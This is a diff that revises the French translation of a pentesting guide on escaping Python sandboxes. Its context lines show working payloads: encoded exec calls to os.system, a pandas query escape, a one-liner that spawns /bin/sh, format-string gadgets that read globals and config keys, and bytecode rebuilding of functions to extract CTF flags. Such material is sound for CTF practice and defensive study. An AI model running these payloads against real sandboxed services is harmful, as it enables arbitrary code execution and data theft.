@@ -112,7 +112,7 @@ exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x
 exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #Only python2
 exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
 ```
-### D'autres bibliothèques qui permettent d'évaluer du code python
+### Autres bibliothèques qui permettent d'évaluer du code python
 ```python
 #Pandas
 import pandas as pd
@@ -135,7 +135,7 @@ df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']
 [y:=().__class__.__base__.__subclasses__()[84]().load_module('builtins'),y.__import__('signal').alarm(0), y.exec("import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit()", {"__builtins__":y.__dict__})]
 ## This is very useful for code injected inside "eval" as it doesn't support multiple lines or ";"
 ```
-## Contournement des protections par le biais des encodages (UTF-7)
+## Contournement des protections par encodages (UTF-7)
 
 Dans [**ce rapport**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy), UFT-7 est utilisé pour charger et exécuter du code python arbitraire à l'intérieur d'un apparent sandbox :
 ```python
@@ -251,7 +251,7 @@ Sub['import os; os.system("sh")']
 ```
 #### Création d'objets avec des exceptions
 
-Lorsque une **exception est déclenchée**, un objet de l'**Exception** est **créé** sans que vous ayez besoin d'appeler le constructeur directement (un truc de [**@\_nag0mez**](https://mobile.twitter.com/_nag0mez)):
+Lorsque **une exception est déclenchée**, un objet de **l'Exception** est **créé** sans que vous ayez besoin d'appeler le constructeur directement (un truc de [**@\_nag0mez**](https://mobile.twitter.com/_nag0mez)):
 ```python
 class RCE(Exception):
 def __init__(self):
@@ -314,7 +314,7 @@ __builtins__.__dict__['__import__']("os").system("ls")
 ```
 ### Pas de Builtins
 
-Lorsque vous n'avez pas `__builtins__`, vous ne pourrez rien importer ni même lire ou écrire des fichiers car **toutes les fonctions globales** (comme `open`, `import`, `print`...) **ne sont pas chargées**.\
+Lorsque vous n'avez pas `__builtins__`, vous ne pourrez pas importer quoi que ce soit ni même lire ou écrire des fichiers car **toutes les fonctions globales** (comme `open`, `import`, `print`...) **ne sont pas chargées**.\
 Cependant, **par défaut, python importe beaucoup de modules en mémoire**. Ces modules peuvent sembler bénins, mais certains d'entre eux **importent également des** fonctionnalités **dangereuses** à l'intérieur qui peuvent être accessibles pour obtenir même **une exécution de code arbitraire**.
 
 Dans les exemples suivants, vous pouvez observer comment **abuser** de certains de ces modules "**bénins**" chargés pour **accéder** à des **fonctionnalités** **dangereuses** à l'intérieur d'eux.
@@ -682,7 +682,7 @@ people = PeopleInfo('GEEKS', 'FORGEEKS')
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
 get_name_for_avatar(st, people_obj = people)
 ```
-Notez comment vous pouvez **accéder aux attributs** de manière normale avec un **point** comme `people_obj.__init__` et un **élément dict** avec des **parenthèses** sans guillemets `__globals__[CONFIG]`
+Notez comment vous pouvez **accéder aux attributs** de manière normale avec un **point** comme `people_obj.__init__` et un **élément dict** avec **parenthèses** sans guillemets `__globals__[CONFIG]`
 
 Notez également que vous pouvez utiliser `.__dict__` pour énumérer les éléments d'un objet `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
 
@@ -704,8 +704,9 @@ return 'HAL 9000'
 ```
 **Plus d'exemples** sur les **exemples de chaînes de format** peuvent être trouvés sur [**https://pyformat.info/**](https://pyformat.info)
 
-> [!AVERTISSEMENT]
+> [!CAUTION]
 > Vérifiez également la page suivante pour des gadgets qui **lire des informations sensibles à partir des objets internes de Python** :
+
 
 {{#ref}}
 ../python-internal-read-gadgets.md
@@ -775,7 +776,7 @@ Le défi abuse en réalité d'une autre vulnérabilité sur le serveur qui perme
 > [!TIP]
 > Si vous voulez **apprendre** sur le **bytecode python** en profondeur, lisez ce **superbe** article sur le sujet : [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 
-Dans certains CTF, vous pourriez recevoir le nom d'une **fonction personnalisée où se trouve le flag** et vous devez examiner les **internes** de la **fonction** pour l'extraire.
+Dans certains CTFs, vous pourriez recevoir le nom d'une **fonction personnalisée où se trouve le flag** et vous devez voir les **internes** de la **fonction** pour l'extraire.
 
 C'est la fonction à inspecter :
 ```python
@@ -797,7 +798,7 @@ dir(get_flag) #Get info tof the function
 ```
 #### globals
 
-`__globals__` et `func_globals`(Identique) Obtient l'environnement global. Dans l'exemple, vous pouvez voir certains modules importés, quelques variables globales et leur contenu déclaré :
+`__globals__` et `func_globals` (Identique) Obtient l'environnement global. Dans l'exemple, vous pouvez voir certains modules importés, quelques variables globales et leur contenu déclaré :
 ```python
 get_flag.func_globals
 get_flag.__globals__
@@ -923,7 +924,7 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 ## Compilation de Python
 
 Maintenant, imaginons que d'une manière ou d'une autre, vous pouvez **extraire les informations sur une fonction que vous ne pouvez pas exécuter** mais que vous **devez** **exécuter**.\
-Comme dans l'exemple suivant, vous **pouvez accéder à l'objet code** de cette fonction, mais en lisant simplement le désassemblage, vous **ne savez pas comment calculer le flag** (_imaginez une fonction `calc_flag` plus complexe_)
+Comme dans l'exemple suivant, vous **pouvez accéder à l'objet code** de cette fonction, mais en lisant le désassemblage, vous **ne savez pas comment calculer le flag** (_imaginez une fonction `calc_flag` plus complexe_)
 ```python
 def get_flag(some_input):
 var1=1
@@ -958,7 +959,7 @@ mydict['__builtins__'] = __builtins__
 function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 > [!TIP]
-> Selon la version de python, les **paramètres** de `code_type` peuvent avoir un **ordre différent**. La meilleure façon de connaître l'ordre des paramètres dans la version de python que vous exécutez est de lancer :
+> En fonction de la version de python, les **paramètres** de `code_type` peuvent avoir un **ordre différent**. La meilleure façon de connaître l'ordre des paramètres dans la version de python que vous exécutez est de lancer :
 >
 > ```
 > import types
@@ -969,7 +970,7 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 ### Recréer une fonction divulguée
 
 > [!WARNING]
-> Dans l'exemple suivant, nous allons prendre toutes les données nécessaires pour recréer la fonction directement à partir de l'objet code de la fonction. Dans un **exemple réel**, toutes les **valeurs** pour exécuter la fonction **`code_type`** sont ce que **vous devrez divulguer**.
+> Dans l'exemple suivant, nous allons prendre toutes les données nécessaires pour recréer la fonction directement à partir de l'objet code de la fonction. Dans un **exemple réel**, toutes les **valeurs** pour exécuter la fonction **`code_type`** est ce que **vous devrez divulguer**.
 ```python
 fc = get_flag.__code__
 # In a real situation the values like fc.co_argcount are the ones you need to leak
@@ -1020,9 +1021,9 @@ ctype = type((lambda: None).func_code)
 f = ftype(ctype(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S', (None,), (), ('s',), 'stdin', 'f', 1, ''), {})
 f(42)
 ```
-## Décompiler du Python compilé
+## Décompilation de Python Compilé
 
-En utilisant des outils comme [**https://www.decompiler.com/**](https://www.decompiler.com), on peut **décompiler** du code python compilé donné.
+En utilisant des outils comme [**https://www.decompiler.com/**](https://www.decompiler.com), on peut **décompiler** un code python compilé donné.
 
 **Consultez ce tutoriel** :
 
@@ -1034,7 +1035,7 @@ En utilisant des outils comme [**https://www.decompiler.com/**](https://www.deco
 
 ### Assert
 
-Python exécuté avec des optimisations avec le paramètre `-O` supprimera les instructions assert et tout code conditionnel sur la valeur de **debug**.\
+Python exécuté avec des optimisations avec le paramètre `-O` supprimera les instructions d'assertion et tout code conditionnel sur la valeur de **debug**.\
 Par conséquent, des vérifications comme
 ```python
 def check_permission(super_user):
